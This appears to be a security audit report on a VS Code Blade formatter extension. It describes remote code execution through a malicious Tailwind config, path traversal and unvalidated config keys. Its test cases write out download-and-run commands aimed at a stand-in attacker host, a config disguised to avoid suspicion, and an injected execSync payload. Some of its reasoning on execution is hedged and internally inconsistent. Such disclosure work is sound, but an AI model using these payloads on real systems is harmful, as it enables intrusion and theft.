# Vulnerabilities

## 1. Remote Code Execution through Malicious Tailwind Configuration Files

### Description
The extension contains a critical vulnerability allowing remote code execution via malicious tailwind.config.js files. When a user opens a repository containing a crafted tailwind configuration file, the extension will load and execute this JavaScript file without proper sandboxing. The `requireUncached` function in `util.ts` reads the file content using `fs.readFileSync` and transforms it using `sucrase.transform`, but ultimately this JavaScript code will be executed in the VS Code extension context.

Although `requireUncached()` merely reads and transforms the file (using Sucrase) without directly executing it, the resulting value (or simply the file path) is passed as part of the options into the underlying "blade-formatter" library. In many formatter libraries the configuration file is then loaded (using a normal `require()` or dynamic import) to drive class sorting. An attacker supplying a repository with a malicious Tailwind configuration file can cause the vulnerable extension to load and execute that file when a Blade file is formatted.

### Impact
An attacker can execute arbitrary code with the same privileges as VS Code, which could lead to:
- Complete compromise of the user's machine
- Access to all files accessible by the VS Code process
- Theft of sensitive information like tokens, SSH keys, and credentials
- Persistence through installing additional malware
- Data exfiltration or further attacks on the development environment

### Vulnerability Rank
Critical

### Currently Implemented Mitigations
The extension has limited error handling when loading tailwind configuration files, falling back to a default configuration if there's an error, but this does not prevent the initial code execution. The extension does parse runtime configuration using AJV and catches errors when attempting to load the Tailwind config.

### Missing Mitigations
- No sandboxing of loaded JavaScript code
- No content validation before execution
- No allowlist of permitted operations in tailwind configuration files
- No validation or sandboxing on the file pointed to by the `tailwindcssConfigPath` property
- The runtime configuration (and in particular, the Tailwind config path) is accepted "as is" and later passed along to the underlying formatter library

### Preconditions
- The victim must have the VS Code Blade Formatter extension installed
- The victim must open a repository containing a malicious tailwind.config.js file
- The extension must format a blade file or be triggered to read the tailwind configuration
- The repository includes a runtime configuration (e.g. in a `.bladeformatterrc.json`) that sets `"sortTailwindcssClasses": true` and specifies a non–default value of `"tailwindcssConfigPath"`, resolved to the malicious file.

### Source Code Analysis
The vulnerability exists in the extension.ts file where tailwind configuration is loaded and in the util.ts file where the execution happens:

1. In extension.ts (line ~160-175):
```typescript
const tailwindConfigPath = resolveTailwindConfig(
    document.uri.fsPath,
    runtimeConfig?.tailwindcssConfigPath ?? "",
);
tailwindConfig.tailwindcssConfigPath = tailwindConfigPath;

try {
    requireUncached(tailwindConfigPath);
} catch (error) {
    // fallback to default config
    tailwindConfig.tailwindcssConfigPath =
        __non_webpack_require__.resolve(
            "tailwindcss/lib/public/default-config",
        );
}
```

2. The dangerous function is in util.ts (line ~23-36):
```typescript
export function requireUncached(moduleName: string) {
    try {
        delete __non_webpack_require__.cache[
            __non_webpack_require__.resolve(moduleName)
        ];

        const fileContent = fs.readFileSync(moduleName, "utf8");

        return transform(fileContent, { transforms: ["imports"] });
    } catch (err: any) {
        throw err;
    }
}
```

3. The option object is then constructed by spreading the standard extension configuration, any runtime configuration, and the `tailwindConfig` object:
```js
const options = {
  …,
  ...runtimeConfig, // override all settings by runtime config
  …tailwindConfig,
};
```

4. This final object is passed to `new Formatter(options)` (from the imported "blade-formatter" library).

When a user opens a repository and the extension is activated, it will look for tailwind configuration files. If the user has provided or the extension finds a tailwind.config.js file, it will load and execute this file without proper sandboxing. The loading happens through the `requireUncached` function, which reads the file content and transforms it using sucrase. The transformed code is then executed in the context of the VS Code extension.

### Security Test Case
1. Create a malicious tailwind.config.js file in a repository:
```javascript
// Malicious tailwind.config.js
const { execSync } = require('child_process');

// Execute malicious commands
// On Windows
execSync('powershell.exe -Command "Invoke-WebRequest -Uri https://attacker.com/payload.exe -OutFile %TEMP%\\payload.exe; Start-Process %TEMP%\\payload.exe"');

// On macOS/Linux 
execSync('curl -s https://attacker.com/payload.sh | bash');

// Legitimate-looking config so it doesn't raise suspicion
module.exports = {
  theme: {
    extend: {
      colors: {
        primary: '#FF0000',
      },
    },
  },
  plugins: [],
}
```

2. In the repository root add a runtime configuration file (e.g. `.bladeformatterrc.json`) with content similar to:
```json
{
  "sortTailwindcssClasses": true,
  "tailwindcssConfigPath": "./maliciousTailwind.config.js"
}
```

3. Host this repository on GitHub or another platform.

4. Convince the victim to open this repository in VS Code.

5. When the victim opens a Blade file in the repository, the formatter will find the configuration, load the malicious file, and the code will execute.

6. Verify that attacker.com receives the connection, confirming code execution.

## 2. Path Traversal in Tailwind Configuration Path Resolution

### Description
The extension contains a path traversal vulnerability in the way it resolves tailwind configuration paths. The `resolveTailwindConfig` function in `tailwind.ts` takes a user-controlled path and resolves it without proper validation, allowing attackers to specify arbitrary paths on the filesystem.

### Impact
This vulnerability allows an attacker to:
- Read sensitive files from the victim's system by specifying paths like "../../../etc/passwd"
- Execute arbitrary files if combined with the RCE vulnerability above
- Potentially write to arbitrary files

### Vulnerability Rank
High

### Currently Implemented Mitigations
Limited checks are performed on the path, but they are insufficient to prevent path traversal.

### Missing Mitigations
- No validation that the resolved path remains within the workspace
- No sanitization of paths to remove traversal sequences
- No allowlist of permitted paths

### Preconditions
- The victim must open a repository containing a malicious configuration
- The configuration must specify a tailwindcssConfigPath that contains path traversal sequences

### Source Code Analysis
The vulnerability exists in the `resolveTailwindConfig` function in tailwind.ts:

```typescript
export function resolveTailwindConfig(
    filepath: string,
    optionPath: string,
): string {
    if (!optionPath) {
        return findConfig(__config__, { cwd: path.dirname(filepath) }) ?? "";
    }

    if (path.isAbsolute(optionPath ?? "")) {
        return optionPath;  // Directly returns absolute paths without validation
    }

    const runtimeConfigPath = findConfigFile(filepath);

    return path.resolve(path.dirname(runtimeConfigPath ?? ""), optionPath ?? "");  // Vulnerable to path traversal
}
```

The function accepts an `optionPath` parameter, which can be controlled by an attacker through the runtime configuration file. If `optionPath` is an absolute path, it is returned directly without validation. If it's a relative path, it's resolved against the runtime configuration path directory, which can also lead to traversal outside of the intended directory.

This vulnerability works in conjunction with the RCE vulnerability above, allowing an attacker to specify a path to a malicious JavaScript file anywhere on the victim's filesystem.

### Security Test Case
1. Create a malicious .bladeformatterrc.json file in a repository:
```json
{
    "tailwindcssConfigPath": "../../../malicious-config.js"
}
```

2. Create a malicious-config.js file that will be placed in a known location on the victim's system:
```javascript
const { execSync } = require('child_process');
execSync('malicious command here');

module.exports = {
    // Normal-looking config
    theme: {}
};
```

3. When the victim opens a Blade file in the repository, the formatter will:
   - Find the .bladeformatterrc.json file
   - Extract the tailwindcssConfigPath value
   - Resolve the path, which traverses up multiple directories
   - Load and execute the malicious-config.js file

4. The malicious command will execute in the victim's environment.

## 3. Unvalidated Runtime Configuration Injection Leading to Potential Code Injection

### Description
The extension reads additional formatting settings from a runtime configuration file (either `.bladeformatterrc.json` or `.bladeformatterrc`) using the function `readRuntimeConfig()` in `runtimeConfig.ts`. Although standard options (such as `indentSize`, `wrapLineLength`, etc.) are defined in the AJV schema, the schema uses the option `additionalProperties: true`. This means that any extra keys not prescribed by the schema are accepted without further validation. Later in `extension.ts` these extra (and potentially attacker–controlled) properties are merged into the options passed to the underlying formatter by spreading the `runtimeConfig` object. If the underlying "blade-formatter" library is not designed to safely ignore unknown options and instead uses them directly—for example by incorporating them into dynamic function calls or template evaluations—this may allow an attacker to inject malicious code and trigger arbitrary execution.

### Impact
Exploitation could lead to arbitrary code injection within the formatter's runtime context. Although the immediate consequence depends on how the "blade-formatter" library makes use of these extra options, successful exploitation would allow a threat actor to execute arbitrary code in the victim's VS Code environment.

### Vulnerability Rank
High

### Currently Implemented Mitigations
- The runtime configuration file is parsed as JSON and validated using a JSON schema (via AJV), which ensures that known properties have the expected types.

### Missing Mitigations
- The schema permits additional properties via `additionalProperties: true` without any further checks, so there is no whitelist enforcement to block unexpected keys.
- There is no explicit filtering or sanitization step for extra keys before they are merged into the options object sent to the Formatter.
- If the underlying "blade-formatter" library does not securely handle extra configuration keys, this may lead to code injection.

### Preconditions
- The victim opens a repository that includes a custom runtime configuration file (e.g. `.bladeformatterrc.json`) embedded with extra properties (beyond those expected by the schema).
- The underlying "blade-formatter" library uses the combined options in an unsafe (for example, evaluated) manner.

### Source Code Analysis
1. In `runtimeConfig.ts`, the function `readRuntimeConfig()` is declared. It loads a configuration file (if one is found by `findConfigFile()`) and converts it to a string.  
2. The AJV JTD schema is defined with its `optionalProperties` for standard options but explicitly sets `additionalProperties: true`, meaning that any keys not defined in the schema are retained.  
3. In `extension.ts`, after loading both the extension setting and the runtime configuration, the two are merged into one options object using the spread operator:
   ```js
   const options = {
     …,
     ...runtimeConfig, // override all settings by runtime config
     …tailwindConfig,
   };
   ```
4. This merged options object is passed into the Formatter constructor (`new Formatter(options)`). If the underlying "blade-formatter" uses any of these extra options (for example, if it constructs dynamic logic based on the keys present), an attacker supplying additional properties could trigger unsafe code paths.

### Security Test Case
1. In a test repository, create a runtime configuration file (e.g. `.bladeformatterrc.json`) containing both valid options and an extra, unexpected property. For example:
   ```json
   {
     "indentSize": 4,
     "sortTailwindcssClasses": false,
     "maliciousKey": "console.log(require('child_process').execSync('touch /tmp/injected'));"
   }
   ```
2. Open the repository in VS Code with the blade-formatter extension installed.  
3. Trigger formatting (for instance by running the "Blade: Format Document" command).  
4. Monitor whether the extra property "maliciousKey" is used in any dynamic evaluation (e.g. by checking if a file such as `/tmp/injected` is unexpectedly created or if console output occurs).  
5. Such behavior would confirm that unsanitized additional properties from the runtime configuration can affect the formatting process, potentially leading to arbitrary code execution.